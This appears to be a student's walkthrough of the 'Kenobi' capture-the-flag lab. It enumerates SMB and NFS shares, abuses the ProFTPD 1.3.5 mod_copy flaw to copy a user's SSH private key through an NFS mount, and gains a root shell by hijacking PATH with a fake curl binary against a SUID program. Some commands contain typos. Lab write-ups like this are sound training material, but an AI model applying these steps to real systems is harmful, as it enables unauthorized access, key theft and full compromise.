# Kenobi  

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.


Samba is the standard Windows interoperability suite of programs for Linux and Unix.
Samba allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet.  
Often referred to as a network file system. 
Samba is based on the common client/server protocol of Server Message Block (SMB).  
SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

## Enumeration

### Basic Enumeration  

`:> nmap 10.10.4.67 -oN firstScan.txt`

```md
Not shown: 993 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
```

### Enumerate RCPBind 

-Remote Procedure Call (RPC) is inter-process communication technique
-allows clients/servers to communicate on network
-RPCBIND accepts port reservations from local RPC services and then advertises the combination of RPCs and ports

`:> nmap -A -p 111 10.10.4.67`

```md
PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      42389/udp  mountd
|   100005  1,2,3      58809/tcp  mountd
|   100021  1,3,4      34411/tcp  nlockmgr
|   100021  1,3,4      41152/udp  nlockmgr
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl  
```

`:> nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.4.67`

```md
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836528.0  6877100.0  22%   16.0T        32000
MAC Address: 02:33:0F:68:C2:FD (Unknown)
```
reveals `/var` can be mounted  

### Enumeration for SAMBA


`:> nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.4.67`

```md
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:33:0F:68:C2:FD (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.4.67\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.4.67\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.4.67\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>  
``` 

### Interact with Samba

smbclient //<IP>/share
mget <filename>
smbget -R smb://<ip>/<share> (recursive download entire share)  

## Gain Initial Accesss with ProFtpd  

`nmap -A -p 21 10.10.4.67`

```md
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
MAC Address: 02:33:0F:68:C2:FD (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OS: Unix
```

[exploit-db shows "mod_copy" module vulnerability](https://www.exploit-db.com/exploits/49908)  

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server.  
Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.  

### Copy user Kenobi's private key

`:> nc 10.10.4.67 21` : establish unauthenticated access to proftpd  

#### mount /var/tmp to local machine

`:> mkdir /mntkenobiNFS`  
`:> mount 10.10.4.67:/var /mnt/kenobiNFS`  
`:> ls -la /mnt/kenobiNFS/tmp`  

#### Login to Kenobi's account

`:> cp /mnt/kenobiNFS/tmp/id_rsa /home`
`:> sudo chmod 600 id_rsa`  
`:> ssh -i id_rsa kenobi@<targetIP>`  

## Privilege Escalation with Path Variable Manipulation  

tried 'sudo -l' but because we didn't crack the password, we cant use "sudo"  

`:> find /-perm -u=s -type f 2>/dev/null`

`usr/bin/menu` can be run, and reveals system status options  

`:> strings /usr/bin/menu` : shows this binary calls commands without using full path, meaning it is open to path expliotations 

`curl -I localhose`  
`uname -r`  
`ifconfig`  

### make own shell

'echo /bin/sh > /tmp/curl'
'chmod 777 /tmp/curl'
'export PATH=/tmp:$PATH' <- /usr/bin/menu binary will run our curl, which is now on $PATH>

